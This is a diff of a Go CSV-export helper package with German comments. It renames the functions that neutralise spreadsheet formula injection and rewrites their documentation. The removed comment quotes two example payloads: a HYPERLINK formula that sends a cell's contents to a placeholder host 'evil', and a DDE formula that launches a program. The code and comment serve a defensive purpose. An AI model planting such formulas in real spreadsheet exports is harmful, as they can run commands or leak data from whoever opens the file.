@@ -1,17 +1,11 @@
-// Package csvutil enthält Helfer für den sicheren CSV-Export.
+// Package csvutil entschärft Zellen für den Export nach CSV.
 package csvutil
 
-// SanitizeCell schützt vor CSV-/Formel-Injection (CWE-1236).
-//
-// Tabellenkalkulationen (Excel, LibreOffice, Google Sheets) interpretieren eine Zelle,
-// die mit = + - @ oder einem Steuerzeichen (Tab/CR/LF) beginnt, als Formel. Stammt der
-// Zellinhalt aus importierten Katalogen oder Nutzereingaben (z. B. ein Buchtitel
-// "=HYPERLINK(\"http://evil/?\"&A1)" oder "=cmd|'/c calc'!A1"), kann beim bloßen Öffnen
-// der exportierten Datei Code ausgeführt oder Daten exfiltriert werden.
-//
-// Mitigation (OWASP): solchen Zellen ein Apostroph voranstellen — die Tabellenkalkulation
-// zeigt dann den Literaltext und wertet nichts aus.
-func SanitizeCell(s string) string {
+// entschaerfeZelle stellt einer Zelle ein Apostroph voran, wenn sie mit =, +, -, @ oder einem
+// Steuerzeichen beginnt. Eine Tabellenkalkulation rechnet eine solche Zelle sonst als Formel
+// aus, und ein Titel aus einem importierten Katalog könnte beim Öffnen der Datei Befehle
+// ausführen oder Daten verschicken.
+func entschaerfeZelle(s string) string {
 	if s == "" {
 		return s
 	}
@@ -22,11 +16,11 @@ func SanitizeCell(s string) string {
 	return s
 }
 
-// SanitizeRow gibt eine neue Zeile zurück, in der jede Zelle über SanitizeCell abgesichert ist.
-func SanitizeRow(row []string) []string {
-	out := make([]string, len(row))
-	for i, c := range row {
-		out[i] = SanitizeCell(c)
+// EntschaerfeZeile liefert eine neue Zeile, in der jede Zelle entschärft ist.
+func EntschaerfeZeile(zeile []string) []string {
+	entschaerft := make([]string, len(zeile))
+	for i, zelle := range zeile {
+		entschaerft[i] = entschaerfeZelle(zelle)
 	}
-	return out
+	return entschaerft
 }
